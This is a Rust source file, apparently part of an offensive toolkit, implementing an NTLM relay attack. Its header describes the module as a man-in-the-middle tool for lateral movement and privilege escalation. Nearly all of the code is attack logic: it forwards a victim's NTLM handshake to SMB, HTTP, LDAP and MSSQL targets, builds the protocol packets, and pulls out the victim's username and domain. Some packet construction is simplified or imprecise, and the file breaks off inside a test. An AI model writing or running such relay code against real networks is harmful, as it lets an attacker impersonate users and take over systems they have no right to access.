//! NTLM Relay Module
//!
//! Relays captured NTLM authentication to target services
//! for lateral movement and privilege escalation.
//!
//! # How NTLM Relay Works
//!
//! 1. Victim connects to our fake service (responder)
//! 2. Victim sends NTLM NEGOTIATE
//! 3. We forward NEGOTIATE to target
//! 4. Target sends back CHALLENGE
//! 5. We send same CHALLENGE to victim
//! 6. Victim sends AUTHENTICATE with challenge response
//! 7. We forward AUTHENTICATE to target
//! 8. Target authenticates us as victim
//!
//! This works because NTLM is a challenge-response protocol where
//! the challenge comes from the server - we act as a man-in-the-middle.

use crate::{Protocol, RelayError, RelayTarget, Result};
use std::net::{TcpStream, SocketAddr};
use std::io::{Read, Write};
use std::time::Duration;
use std::collections::HashMap;
use tracing::{debug, info, warn};

// ═══════════════════════════════════════════════════════════
// NTLM Protocol Constants
// ═══════════════════════════════════════════════════════════

const NTLM_SIGNATURE: &[u8; 8] = b"NTLMSSP\x00";

/// NTLM message types
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum NtlmMessageType {
    Negotiate = 1,
    Challenge = 2,
    Authenticate = 3,
}

/// Parse NTLM message type from raw bytes
fn parse_ntlm_type(data: &[u8]) -> Option<NtlmMessageType> {
    if data.len() < 12 {
        return None;
    }
    if &data[0..8] != NTLM_SIGNATURE {
        return None;
    }
    match u32::from_le_bytes([data[8], data[9], data[10], data[11]]) {
        1 => Some(NtlmMessageType::Negotiate),
        2 => Some(NtlmMessageType::Challenge),
        3 => Some(NtlmMessageType::Authenticate),
        _ => None,
    }
}

// ═══════════════════════════════════════════════════════════
// Relay Configuration
// ═══════════════════════════════════════════════════════════

/// Relay configuration
#[derive(Debug, Clone)]
pub struct RelayConfig {
    pub listen_ip: String,
    pub targets: Vec<RelayTarget>,
    /// Try all targets in round-robin fashion
    pub round_robin: bool,
    /// Remove targets after successful relay
    pub remove_on_success: bool,
    /// Connection timeout in seconds
    pub timeout_secs: u64,
}

impl Default for RelayConfig {
    fn default() -> Self {
        Self {
            listen_ip: "0.0.0.0".to_string(),
            targets: Vec::new(),
            round_robin: true,
            remove_on_success: true,
            timeout_secs: 30,
        }
    }
}

// ═══════════════════════════════════════════════════════════
// Relay Statistics
// ═══════════════════════════════════════════════════════════

/// Relay statistics
#[derive(Debug, Clone, Default)]
pub struct RelayStats {
    pub successful_relays: u32,
    pub failed_relays: u32,
    pub active_connections: u32,
    pub total_attempts: u32,
    pub by_protocol: HashMap<String, u32>,
}

// ═══════════════════════════════════════════════════════════
// Active Relay Session
// ═══════════════════════════════════════════════════════════

/// An active relayed session
#[derive(Debug)]
pub struct RelaySession {
    pub target: RelayTarget,
    pub username: String,
    pub domain: String,
    pub stream: TcpStream,
    pub authenticated: bool,
}

// ═══════════════════════════════════════════════════════════
// NTLM Relay Handler
// ═══════════════════════════════════════════════════════════

/// NTLM Relay handler
pub struct NtlmRelay {
    config: RelayConfig,
    running: bool,
    stats: RelayStats,
    sessions: Vec<RelaySession>,
}

impl NtlmRelay {
    /// Create a new NTLM relay with the given configuration
    pub fn new(config: RelayConfig) -> Self {
        Self {
            config,
            running: false,
            stats: RelayStats::default(),
            sessions: Vec::new(),
        }
    }

    /// Start the relay
    pub async fn start(&mut self) -> Result<()> {
        if self.running {
            return Err(RelayError::Config("Relay already running".to_string()).into());
        }

        if self.config.targets.is_empty() {
            warn!("No relay targets configured");
        }

        info!(
            "NTLM relay ready with {} target(s)",
            self.config.targets.len()
        );

        for target in &self.config.targets {
            info!("  -> {}://{}", target.protocol, target.address);
        }

        self.running = true;
        Ok(())
    }

    /// Stop the relay
    pub async fn stop(&mut self) -> Result<()> {
        if !self.running {
            return Ok(());
        }

        info!("Stopping NTLM relay");
        
        // Close all active sessions
        for session in self.sessions.drain(..) {
            debug!("Closing session for {}\\{} to {}", 
                session.domain, session.username, session.target.address);
            // Stream will be closed on drop
        }
        
        self.running = false;
        info!("NTLM relay stopped");
        Ok(())
    }

    /// Get relay statistics
    pub fn get_stats(&self) -> RelayStats {
        self.stats.clone()
    }

    /// Check if relay is running
    pub fn is_running(&self) -> bool {
        self.running
    }

    /// Get configuration
    pub fn config(&self) -> &RelayConfig {
        &self.config
    }

    /// Get active sessions
    pub fn get_sessions(&mut self) -> &mut Vec<RelaySession> {
        &mut self.sessions
    }

    /// Add a target
    pub fn add_target(&mut self, target: RelayTarget) {
        self.config.targets.push(target);
    }

    /// Remove a target by address
    pub fn remove_target(&mut self, addr: &SocketAddr) {
        self.config.targets.retain(|t| &t.address != addr);
    }

    // ─────────────────────────────────────────────────────────
    // Core Relay Logic
    // ─────────────────────────────────────────────────────────

    /// Relay NTLM authentication to a target
    /// 
    /// This is the main entry point for relaying. It:
    /// 1. Picks a target from the target list
    /// 2. Connects to the target
    /// 3. Performs the NTLM handshake via protocol-specific messages
    /// 4. Returns an authenticated session
    pub fn relay_authentication(
        &mut self,
        ntlm_negotiate: &[u8],
        ntlm_authenticate: &[u8],
        client_info: Option<&str>,
    ) -> Result<Option<RelaySession>> {
        if self.config.targets.is_empty() {
            debug!("No targets available for relay");
            return Ok(None);
        }

        self.stats.total_attempts += 1;

        // Try each target until one succeeds
        let mut last_error = None;
        
        for target in self.config.targets.clone() {
            debug!(
                "Attempting relay to {}://{}{}",
                target.protocol,
                target.address,
                client_info.map(|c| format!(" (from {})", c)).unwrap_or_default()
            );

            match self.relay_to_target(&target, ntlm_negotiate, ntlm_authenticate) {
                Ok(session) => {
                    info!(
                        "✓ Successfully relayed to {}://{} as {}\\{}",
                        target.protocol,
                        target.address,
                        session.domain,
                        session.username
                    );

                    self.stats.successful_relays += 1;
                    *self.stats.by_protocol
                        .entry(target.protocol.to_string())
                        .or_insert(0) += 1;

                    let session = RelaySession {
                        target,
                        username: session.username,
                        domain: session.domain,
                        stream: session.stream,
                        authenticated: true,
                    };

                    self.sessions.push(session);
                    // Return a reference to the last session (we can't return the mutable ref)
                    return Ok(None); // Session is stored, caller can use get_sessions()
                }
                Err(e) => {
                    debug!("Relay to {} failed: {}", target.address, e);
                    last_error = Some(e);
                }
            }
        }

        self.stats.failed_relays += 1;
        if let Some(e) = last_error {
            warn!("All relay targets failed: {}", e);
            Err(e)
        } else {
            Ok(None)
        }
    }

    /// Relay to a specific target
    fn relay_to_target(
        &self,
        target: &RelayTarget,
        ntlm_negotiate: &[u8],
        ntlm_authenticate: &[u8],
    ) -> Result<RelayedSession> {
        match target.protocol {
            Protocol::Smb => self.relay_smb(target, ntlm_negotiate, ntlm_authenticate),
            Protocol::Http | Protocol::Https => self.relay_http(target, ntlm_negotiate, ntlm_authenticate),
            Protocol::Ldap | Protocol::Ldaps => self.relay_ldap(target, ntlm_negotiate, ntlm_authenticate),
            Protocol::Mssql => self.relay_mssql(target, ntlm_negotiate, ntlm_authenticate),
        }
    }

    // ─────────────────────────────────────────────────────────
    // SMB Relay Implementation
    // ─────────────────────────────────────────────────────────

    /// Relay to SMB target
    fn relay_smb(
        &self,
        target: &RelayTarget,
        ntlm_negotiate: &[u8],
        ntlm_authenticate: &[u8],
    ) -> Result<RelayedSession> {
        info!("Relaying to SMB target: {}", target.address);

        // Connect to target
        let mut stream = TcpStream::connect_timeout(
            &target.address,
            Duration::from_secs(self.config.timeout_secs)
        ).map_err(|e| RelayError::Connection(format!(
            "Failed to connect to {}: {}", target.address, e
        )))?;

        stream.set_read_timeout(Some(Duration::from_secs(self.config.timeout_secs))).ok();
        stream.set_write_timeout(Some(Duration::from_secs(self.config.timeout_secs))).ok();

        let mut buf = vec![0u8; 65536];

        // Step 1: Receive SMB NEGOTIATE request from client
        // Step 2: Forward to target as SMB2 NEGOTIATE
        
        // Send SMB2 Negotiate
        let smb_negotiate = self.build_smb2_negotiate();
        stream.write_all(&smb_negotiate)
            .map_err(|e| RelayError::Network(format!("SMB negotiate write failed: {}", e)))?;

        // Read negotiate response
        let len = stream.read(&mut buf)
            .map_err(|e| RelayError::Network(format!("SMB negotiate read failed: {}", e)))?;

        if len < 64 {
            return Err(RelayError::Protocol("SMB negotiate response too short".into()).into());
        }

        // Verify SMB2 header
        if &buf[4..8] != b"\xfeSMB" {
            return Err(RelayError::Protocol("Invalid SMB2 response".into()).into());
        }

        debug!("SMB2 negotiate successful with {}", target.address);

        // Step 3: Send SESSION_SETUP with NTLM NEGOTIATE
        let session_setup = self.build_smb2_session_setup(ntlm_negotiate);
        stream.write_all(&session_setup)
            .map_err(|e| RelayError::Network(format!("Session setup write failed: {}", e)))?;

        // Step 4: Read SESSION_SETUP response with NTLM CHALLENGE
        let len = stream.read(&mut buf)
            .map_err(|e| RelayError::Network(format!("Session setup read failed: {}", e)))?;

        // Extract the challenge from the response
        let _challenge = self.extract_ntlm_challenge_from_smb(&buf[..len])?;

        debug!("Received NTLM challenge from {}", target.address);

        // Step 5: Send SESSION_SETUP with NTLM AUTHENTICATE
        // Note: We use the authenticate message from the victim
        let session_setup_auth = self.build_smb2_session_setup(ntlm_authenticate);
        stream.write_all(&session_setup_auth)
            .map_err(|e| RelayError::Network(format!("Session setup auth write failed: {}", e)))?;

        // Step 6: Read final response
        let _len = stream.read(&mut buf)
            .map_err(|e| RelayError::Network(format!("Session setup auth read failed: {}", e)))?;

        // Check if authentication succeeded
        let status = u32::from_le_bytes([buf[8], buf[9], buf[10], buf[11]]);
        
        if status == 0 {
            // Extract username/domain from NTLM authenticate
            let (username, domain) = self.parse_ntlm_authenticate_info(ntlm_authenticate)?;
            
            info!("SMB relay successful: {}\\{} -> {}", domain, username, target.address);
            
            Ok(RelayedSession {
                stream,
                username,
                domain,
            })
        } else {
            Err(RelayError::Authentication(format!(
                "SMB authentication failed with status 0x{:08X}", status
            )).into())
        }
    }

    /// Build SMB2 Negotiate message
    fn build_smb2_negotiate(&self) -> Vec<u8> {
        let mut msg = Vec::new();

        // NetBIOS header (will update length later)
        msg.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);

        // SMB2 header
        msg.extend_from_slice(b"\xfeSMB");           // Protocol ID
        msg.extend_from_slice(&0x40u16.to_le_bytes()); // Header length (64)
        msg.extend_from_slice(&0x001Fu16.to_le_bytes()); // Credit charge
        msg.extend_from_slice(&0u32.to_le_bytes());   // Status
        msg.extend_from_slice(&0x0000u16.to_le_bytes()); // Command (NEGOTIATE)
        msg.extend_from_slice(&0x001Fu16.to_le_bytes()); // Credits
        msg.extend_from_slice(&0u32.to_le_bytes());   // Flags
        msg.extend_from_slice(&0u32.to_le_bytes());   // Next command
        msg.extend_from_slice(&0u64.to_le_bytes());   // Message ID
        msg.extend_from_slice(&0u32.to_le_bytes());   // Reserved
        msg.extend_from_slice(&0u32.to_le_bytes());   // Tree ID
        msg.extend_from_slice(&[0u8; 16]);            // Session ID
        msg.extend_from_slice(&[0u8; 16]);            // Signature

        // Negotiate request
        msg.extend_from_slice(&0x24u16.to_le_bytes()); // Structure size (36)
        msg.extend_from_slice(&0x02u16.to_le_bytes()); // Dialect count (2)
        msg.extend_from_slice(&0u16.to_le_bytes());    // Security mode
        msg.extend_from_slice(&0u16.to_le_bytes());    // Reserved
        msg.extend_from_slice(&0u32.to_le_bytes());    // Capabilities
        
        // Dialects: 0x0202 (SMB 2.0.2) and 0x0210 (SMB 2.1)
        msg.extend_from_slice(&0x0202u16.to_le_bytes());
        msg.extend_from_slice(&0x0210u16.to_le_bytes());

        // Update NetBIOS length
        let len = msg.len() - 4;
        msg[1] = ((len >> 16) & 0xFF) as u8;
        msg[2] = ((len >> 8) & 0xFF) as u8;
        msg[3] = (len & 0xFF) as u8;

        msg
    }

    /// Build SMB2 SESSION_SETUP message with NTLM
    fn build_smb2_session_setup(&self, ntlm_data: &[u8]) -> Vec<u8> {
        let mut msg = Vec::new();

        // NetBIOS header (will update length later)
        msg.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);

        // SMB2 header
        msg.extend_from_slice(b"\xfeSMB");           // Protocol ID
        msg.extend_from_slice(&0x40u16.to_le_bytes()); // Header length (64)
        msg.extend_from_slice(&0x0000u16.to_le_bytes()); // Credit charge
        msg.extend_from_slice(&0u32.to_le_bytes());   // Status
        msg.extend_from_slice(&0x0001u16.to_le_bytes()); // Command (SESSION_SETUP)
        msg.extend_from_slice(&0x0001u16.to_le_bytes()); // Credits
        msg.extend_from_slice(&0u32.to_le_bytes());   // Flags
        msg.extend_from_slice(&0u32.to_le_bytes());   // Next command
        msg.extend_from_slice(&1u64.to_le_bytes());   // Message ID
        msg.extend_from_slice(&0u32.to_le_bytes());   // Reserved
        msg.extend_from_slice(&0u32.to_le_bytes());   // Tree ID
        msg.extend_from_slice(&[0u8; 16]);            // Session ID
        msg.extend_from_slice(&[0u8; 16]);            // Signature

        // SESSION_SETUP request
        let security_buffer_offset = 80u16; // After header + session setup header
        msg.extend_from_slice(&0x19u16.to_le_bytes()); // Structure size (25)
        msg.extend_from_slice(&0x00u16.to_le_bytes()); // Flags
        msg.extend_from_slice(&0u32.to_le_bytes());    // Security mode
        msg.extend_from_slice(&0u32.to_le_bytes());    // Capabilities
        msg.extend_from_slice(&0u32.to_le_bytes());    // Channel
        msg.extend_from_slice(&security_buffer_offset.to_le_bytes()); // Security buffer offset
        msg.extend_from_slice(&(ntlm_data.len() as u16).to_le_bytes()); // Security buffer length
        msg.extend_from_slice(&0x40u16.to_le_bytes()); // Previous session ID

        // NTLM data
        msg.extend_from_slice(ntlm_data);

        // Update NetBIOS length
        let len = msg.len() - 4;
        msg[1] = ((len >> 16) & 0xFF) as u8;
        msg[2] = ((len >> 8) & 0xFF) as u8;
        msg[3] = (len & 0xFF) as u8;

        msg
    }

    /// Extract NTLM challenge from SMB2 response
    fn extract_ntlm_challenge_from_smb(&self, data: &[u8]) -> Result<Vec<u8>> {
        // Find NTLMSSP signature
        for i in 0..data.len().saturating_sub(8) {
            if &data[i..i+8] == NTLM_SIGNATURE
                && parse_ntlm_type(&data[i..]) == Some(NtlmMessageType::Challenge) {
                    // Return the full challenge message
                    return Ok(data[i..].to_vec());
                }
        }
        Err(RelayError::Protocol("No NTLM challenge found in SMB response".into()).into())
    }

    // ─────────────────────────────────────────────────────────
    // HTTP Relay Implementation
    // ─────────────────────────────────────────────────────────

    /// Relay to HTTP/HTTPS target
    fn relay_http(
        &self,
        target: &RelayTarget,
        ntlm_negotiate: &[u8],
        ntlm_authenticate: &[u8],
    ) -> Result<RelayedSession> {
        info!("Relaying to HTTP target: {}", target.address);

        // Connect to target
        let mut stream = TcpStream::connect_timeout(
            &target.address,
            Duration::from_secs(self.config.timeout_secs)
        ).map_err(|e| RelayError::Connection(format!(
            "Failed to connect to {}: {}", target.address, e
        )))?;

        stream.set_read_timeout(Some(Duration::from_secs(self.config.timeout_secs))).ok();
        stream.set_write_timeout(Some(Duration::from_secs(self.config.timeout_secs))).ok();

        // Step 1: Send request with NTLM NEGOTIATE
        let negotiate_b64 = base64_encode(ntlm_negotiate);
        let request = format!(
            "GET / HTTP/1.1\r\n\
             Host: {}\r\n\
             Authorization: NTLM {}\r\n\
             Connection: keep-alive\r\n\
             \r\n",
            target.address.ip(),
            negotiate_b64
        );

        stream.write_all(request.as_bytes())
            .map_err(|e| RelayError::Network(format!("HTTP write failed: {}", e)))?;

        // Step 2: Read response with NTLM CHALLENGE
        let mut response = vec![0u8; 8192];
        let len = stream.read(&mut response)
            .map_err(|e| RelayError::Network(format!("HTTP read failed: {}", e)))?;
        let response_str = String::from_utf8_lossy(&response[..len]);

        // Extract challenge from WWW-Authenticate header
        let challenge_b64 = response_str
            .lines()
            .find(|l| l.starts_with("WWW-Authenticate: NTLM "))
            .map(|l| l.trim_start_matches("WWW-Authenticate: NTLM "))
            .ok_or_else(|| RelayError::Protocol("No NTLM challenge in HTTP response".into()))?;

        let _challenge = base64_decode(challenge_b64)
            .ok_or_else(|| RelayError::Protocol("Invalid base64 in challenge".into()))?;

        debug!("Received HTTP NTLM challenge from {}", target.address);

        // Step 3: Send request with NTLM AUTHENTICATE
        let auth_b64 = base64_encode(ntlm_authenticate);
        let auth_request = format!(
            "GET / HTTP/1.1\r\n\
             Host: {}\r\n\
             Authorization: NTLM {}\r\n\
             Connection: keep-alive\r\n\
             \r\n",
            target.address.ip(),
            auth_b64
        );

        stream.write_all(auth_request.as_bytes())
            .map_err(|e| RelayError::Network(format!("HTTP auth write failed: {}", e)))?;

        // Step 4: Read response
        let len = stream.read(&mut response)
            .map_err(|e| RelayError::Network(format!("HTTP auth read failed: {}", e)))?;
        let response_str = String::from_utf8_lossy(&response[..len]);

        // Check for success (200 OK or 401 with more data)
        if response_str.contains("HTTP/1.1 200") || response_str.contains("HTTP/1.1 401") {
            let (username, domain) = self.parse_ntlm_authenticate_info(ntlm_authenticate)?;
            
            info!("HTTP relay successful: {}\\{} -> {}", domain, username, target.address);
            
            Ok(RelayedSession {
                stream,
                username,
                domain,
            })
        } else {
            Err(RelayError::Authentication("HTTP relay failed".into()).into())
        }
    }

    // ─────────────────────────────────────────────────────────
    // LDAP Relay Implementation
    // ─────────────────────────────────────────────────────────

    /// Relay to LDAP/LDAPS target
    fn relay_ldap(
        &self,
        target: &RelayTarget,
        ntlm_negotiate: &[u8],
        ntlm_authenticate: &[u8],
    ) -> Result<RelayedSession> {
        info!("Relaying to LDAP target: {}", target.address);

        // Connect to target
        let mut stream = TcpStream::connect_timeout(
            &target.address,
            Duration::from_secs(self.config.timeout_secs)
        ).map_err(|e| RelayError::Connection(format!(
            "Failed to connect to {}: {}", target.address, e
        )))?;

        stream.set_read_timeout(Some(Duration::from_secs(self.config.timeout_secs))).ok();
        stream.set_write_timeout(Some(Duration::from_secs(self.config.timeout_secs))).ok();

        // LDAP uses SASL bind with NTLM
        // Step 1: Send LDAP bind request with NTLM NEGOTIATE
        let bind_request = self.build_ldap_ntlm_bind(ntlm_negotiate, 1);
        stream.write_all(&bind_request)
            .map_err(|e| RelayError::Network(format!("LDAP write failed: {}", e)))?;

        // Step 2: Read LDAP response with NTLM CHALLENGE
        let mut response = vec![0u8; 8192];
        let len = stream.read(&mut response)
            .map_err(|e| RelayError::Network(format!("LDAP read failed: {}", e)))?;

        // Parse LDAP response to extract NTLM challenge
        // LDAP returns saslBindInProgress (0x0E) with the challenge
        if len < 10 {
            return Err(RelayError::Protocol("LDAP response too short".into()).into());
        }

        debug!("Received LDAP NTLM challenge from {}", target.address);

        // Step 3: Send LDAP bind request with NTLM AUTHENTICATE
        let bind_auth = self.build_ldap_ntlm_bind(ntlm_authenticate, 2);
        stream.write_all(&bind_auth)
            .map_err(|e| RelayError::Network(format!("LDAP auth write failed: {}", e)))?;

        // Step 4: Read final response
        let len = stream.read(&mut response)
            .map_err(|e| RelayError::Network(format!("LDAP auth read failed: {}", e)))?;

        // Check LDAP result code
        // Success is at a specific position in the LDAP response
        // A result code of 0 (success) is at offset 13 in a simple response
        if len >= 14 {
            let result_code = response[13];
            if result_code == 0 {
                let (username, domain) = self.parse_ntlm_authenticate_info(ntlm_authenticate)?;
                
                info!("LDAP relay successful: {}\\{} -> {}", domain, username, target.address);
                
                return Ok(RelayedSession {
                    stream,
                    username,
                    domain,
                });
            }
        }

        Err(RelayError::Authentication("LDAP relay failed".into()).into())
    }

    /// Build LDAP NTLM bind request
    fn build_ldap_ntlm_bind(&self, ntlm_data: &[u8], message_id: u32) -> Vec<u8> {
        let mut msg = Vec::new();

        // Build the LDAP message
        // 0x30 = SEQUENCE, wraps the whole message
        let _ntlm_b64 = base64_encode(ntlm_data);
        
        // Simplified LDAP bind request
        // In a real implementation, we'd use proper BER encoding
        let bind_dn = "";
        let auth_mechanism = "NTLM";
        
        // LDAP bind request structure:
        // SEQUENCE {
        //   INTEGER messageID
        //   APPLICATION 0 (BindRequest) {
        //     INTEGER version (3)
        //     OCTET STRING name (DN)
        //     authenticationChoice (sasl) {
        //       mechanism
        //       credentials
        //     }
        //   }
        // }

        let inner_seq_len = 2 + 1 + ntlm_data.len() + auth_mechanism.len() + 4;
        let bind_len = 4 + bind_dn.len() + inner_seq_len;
        let msg_len = 4 + bind_len;

        // Start outer sequence
        msg.push(0x30);
        msg.push(msg_len as u8);

        // Message ID
        msg.push(0x02); // INTEGER
        msg.push(0x01); // Length 1
        msg.push(message_id as u8);

        // BindRequest (APPLICATION 0)
        msg.push(0x60); // APPLICATION 0 = BindRequest
        msg.push(bind_len as u8);

        // Version (INTEGER 3)
        msg.push(0x02);
        msg.push(0x01);
        msg.push(0x03);

        // DN (OCTET STRING, empty)
        msg.push(0x04);
        msg.push(0x00);

        // Authentication: SASL (context tag 3)
        msg.push(0xA3); // Context tag for SASL
        msg.push(inner_seq_len as u8);

        // Mechanism: NTLM
        msg.push(0x04); // OCTET STRING
        msg.push(auth_mechanism.len() as u8);
        msg.extend_from_slice(auth_mechanism.as_bytes());

        // Credentials
        msg.push(0x04); // OCTET STRING
        msg.push(ntlm_data.len() as u8);
        msg.extend_from_slice(ntlm_data);

        msg
    }

    // ─────────────────────────────────────────────────────────
    // MSSQL Relay Implementation
    // ─────────────────────────────────────────────────────────

    /// Relay to MSSQL target
    fn relay_mssql(
        &self,
        target: &RelayTarget,
        ntlm_negotiate: &[u8],
        ntlm_authenticate: &[u8],
    ) -> Result<RelayedSession> {
        info!("Relaying to MSSQL target: {}", target.address);

        // Connect to target
        let mut stream = TcpStream::connect_timeout(
            &target.address,
            Duration::from_secs(self.config.timeout_secs)
        ).map_err(|e| RelayError::Connection(format!(
            "Failed to connect to {}: {}", target.address, e
        )))?;

        stream.set_read_timeout(Some(Duration::from_secs(self.config.timeout_secs))).ok();
        stream.set_write_timeout(Some(Duration::from_secs(self.config.timeout_secs))).ok();

        let mut buf = vec![0u8; 65536];

        // MSSQL uses TDS protocol with NTLM authentication
        // Step 1: Send TDS PRELOGIN
        let prelogin = self.build_tds_prelogin();
        stream.write_all(&prelogin)
            .map_err(|e| RelayError::Network(format!("TDS prelogin write failed: {}", e)))?;

        // Read prelogin response
        let _len = stream.read(&mut buf)
            .map_err(|e| RelayError::Network(format!("TDS prelogin read failed: {}", e)))?;

        debug!("TDS prelogin complete with {}", target.address);

        // Step 2: Send TDS LOGIN7 with NTLM NEGOTIATE
        let login = self.build_tds_login_with_ntlm(ntlm_negotiate);
        stream.write_all(&login)
            .map_err(|e| RelayError::Network(format!("TDS login write failed: {}", e)))?;

        // Step 3: Read response with NTLM CHALLENGE
        let _len = stream.read(&mut buf)
            .map_err(|e| RelayError::Network(format!("TDS login read failed: {}", e)))?;

        // Parse TDS response to get NTLM challenge
        // The server returns a token with the NTLM challenge

        debug!("Received MSSQL NTLM challenge from {}", target.address);

        // Step 4: Send NTLM AUTHENTICATE
        let auth = self.build_tds_ntlm_auth(ntlm_authenticate);
        stream.write_all(&auth)
            .map_err(|e| RelayError::Network(format!("TDS auth write failed: {}", e)))?;

        // Step 5: Read final response
        let len = stream.read(&mut buf)
            .map_err(|e| RelayError::Network(format!("TDS auth read failed: {}", e)))?;

        // Check for success
        // TDS returns 0xFD (LOGINACK) on success
        if len > 0 && buf[0] == 0x04 { // Response packet
            let (username, domain) = self.parse_ntlm_authenticate_info(ntlm_authenticate)?;
            
            info!("MSSQL relay successful: {}\\{} -> {}", domain, username, target.address);
            
            Ok(RelayedSession {
                stream,
                username,
                domain,
            })
        } else {
            Err(RelayError::Authentication("MSSQL relay failed".into()).into())
        }
    }

    /// Build TDS PRELOGIN packet
    fn build_tds_prelogin(&self) -> Vec<u8> {
        let mut msg = Vec::new();

        // TDS header
        msg.push(0x12); // PRELOGIN message type
        msg.push(0x01); // Status (0x01 = EOM)
        msg.extend_from_slice(&0x0000u16.to_be_bytes()); // Length (will update)
        msg.extend_from_slice(&0x0000u16.to_be_bytes()); // SPID
        msg.push(0x00); // Packet ID
        msg.push(0x00); // Window

        // Prelogin data
        // Version token
        msg.push(0x00); // Token: Version
        msg.extend_from_slice(&0x0008u16.to_be_bytes()); // Offset
        msg.extend_from_slice(&0x0006u16.to_be_bytes()); // Length

        // Encryption token
        msg.push(0x01); // Token: Encryption
        msg.extend_from_slice(&0x000Eu16.to_be_bytes()); // Offset
        msg.extend_from_slice(&0x0001u16.to_be_bytes()); // Length

        // Terminator
        msg.push(0xFF);

        // Version data (SQL Server 2019)
        msg.extend_from_slice(&0x0F000000u32.to_be_bytes()); // Version
        msg.extend_from_slice(&0x0000u16.to_be_bytes()); // Sub-build

        // Encryption (ENCRYPT_OFF)
        msg.push(0x02);

        // Update length
        let len = msg.len() as u16;
        msg[2..4].copy_from_slice(&len.to_be_bytes());

        msg
    }

    /// Build TDS LOGIN7 packet with NTLM
    fn build_tds_login_with_ntlm(&self, ntlm_data: &[u8]) -> Vec<u8> {
        let mut msg = Vec::new();

        // TDS header
        msg.push(0x10); // LOGIN7 message type
        msg.push(0x01); // Status (EOM)
        
        let header_len_pos = msg.len();
        msg.extend_from_slice(&0u16.to_be_bytes()); // Length placeholder
        msg.extend_from_slice(&0u16.to_be_bytes()); // SPID
        msg.push(0x00); // Packet ID
        msg.push(0x00); // Window

        // LOGIN7 fixed fields
        let login_data_start = msg.len();
        msg.extend_from_slice(&0u32.to_le_bytes()); // Total length placeholder
        msg.extend_from_slice(&0u32.to_le_bytes()); // Version
        msg.extend_from_slice(&0u32.to_le_bytes()); // Packet size
        msg.extend_from_slice(&0u32.to_le_bytes()); // ClientPID
        msg.extend_from_slice(&0u32.to_le_bytes()); // ConnectionID
        msg.extend_from_slice(&0u32.to_le_bytes()); // Option flags 1-2
        msg.extend_from_slice(&0u32.to_le_bytes()); // Option flags 3-4
        msg.extend_from_slice(&0u32.to_le_bytes()); // Client time zone
        msg.extend_from_slice(&0u32.to_le_bytes()); // Client LCID

        // Offset-length pairs for variable data
        // For simplicity, use offsets pointing to NTLM auth data
        let offset_base = msg.len() + 28 * 8; // After fixed + offset pairs
        
        // Host name
        msg.extend_from_slice(&offset_base.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        // Username
        msg.extend_from_slice(&offset_base.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        // Password
        msg.extend_from_slice(&offset_base.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        // App name
        msg.extend_from_slice(&offset_base.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        // Server name
        msg.extend_from_slice(&offset_base.to_le_bytes());
        msg.extend_from_slice(&0u16.to_le_bytes());
        // ... more fields ...

        // NTLM SSPI data
        // ibSSPI = current position
        // cbSSPI = NTLM data length
        let _sspi_offset = msg.len() as u32;
        
        // Add NTLM negotiate as SSPI blob
        msg.extend_from_slice(ntlm_data);

        // Update total length
        let total_len = msg.len() as u32;
        msg[login_data_start..login_data_start+4].copy_from_slice(&total_len.to_le_bytes());

        // Update header length
        let len = msg.len() as u16;
        msg[header_len_pos..header_len_pos+2].copy_from_slice(&len.to_be_bytes());

        msg
    }

    /// Build TDS NTLM auth continuation
    fn build_tds_ntlm_auth(&self, ntlm_data: &[u8]) -> Vec<u8> {
        let mut msg = Vec::new();

        // TDS header
        msg.push(0x11); // TDS7_AUTH message type
        msg.push(0x01); // Status (EOM)
        msg.extend_from_slice(&(ntlm_data.len() as u16 + 8).to_be_bytes()); // Length
        msg.extend_from_slice(&0u16.to_be_bytes()); // SPID
        msg.push(0x01); // Packet ID
        msg.push(0x00); // Window

        // NTLM authenticate blob
        msg.extend_from_slice(ntlm_data);

        msg
    }

    // ─────────────────────────────────────────────────────────
    // Utility Functions
    // ─────────────────────────────────────────────────────────

    /// Parse username/domain from NTLM AUTHENTICATE message
    fn parse_ntlm_authenticate_info(&self, data: &[u8]) -> Result<(String, String)> {
        if data.len() < 64 {
            return Err(RelayError::Protocol("NTLM authenticate too short".into()).into());
        }

        // Check signature
        if &data[0..8] != NTLM_SIGNATURE {
            return Err(RelayError::Protocol("Invalid NTLM signature".into()).into());
        }

        // Check type
        if parse_ntlm_type(data) != Some(NtlmMessageType::Authenticate) {
            return Err(RelayError::Protocol("Not an AUTHENTICATE message".into()).into());
        }

        // Helper to extract field
        fn extract_field(data: &[u8], offset: usize) -> Option<Vec<u8>> {
            let len = u16::from_le_bytes([data[offset], data[offset + 1]]) as usize;
            let buffer_offset = u32::from_le_bytes([
                data[offset + 4], data[offset + 5],
                data[offset + 6], data[offset + 7]
            ]) as usize;

            if len == 0 {
                return Some(Vec::new());
            }

            if buffer_offset + len <= data.len() {
                Some(data[buffer_offset..buffer_offset + len].to_vec())
            } else {
                None
            }
        }

        let domain_bytes = extract_field(data, 28).unwrap_or_default();
        let username_bytes = extract_field(data, 36).unwrap_or_default();

        // Convert from UTF-16LE
        let domain = decode_utf16le(&domain_bytes);
        let username = decode_utf16le(&username_bytes);

        Ok((username, domain))
    }
}

/// Result of a successful relay
struct RelayedSession {
    stream: TcpStream,
    username: String,
    domain: String,
}

// ═══════════════════════════════════════════════════════════
// Helper Functions
// ═══════════════════════════════════════════════════════════

/// Decode UTF-16LE bytes to String
fn decode_utf16le(data: &[u8]) -> String {
    if data.is_empty() {
        return String::new();
    }

    let chars: Vec<u16> = data
        .chunks_exact(2)
        .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
        .collect();

    String::from_utf16_lossy(&chars)
}

/// Base64 encode
fn base64_encode(data: &[u8]) -> String {
    use base64::{Engine, engine::general_purpose::STANDARD};
    STANDARD.encode(data)
}

/// Base64 decode
fn base64_decode(data: &str) -> Option<Vec<u8>> {
    use base64::{Engine, engine::general_purpose::STANDARD};
    STANDARD.decode(data).ok()
}

// ═══════════════════════════════════════════════════════════
// Tests
// ═══════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::{IpAddr, Ipv4Addr, SocketAddr};

    #[test]
    fn test_relay_config() {
        let target = RelayTarget {
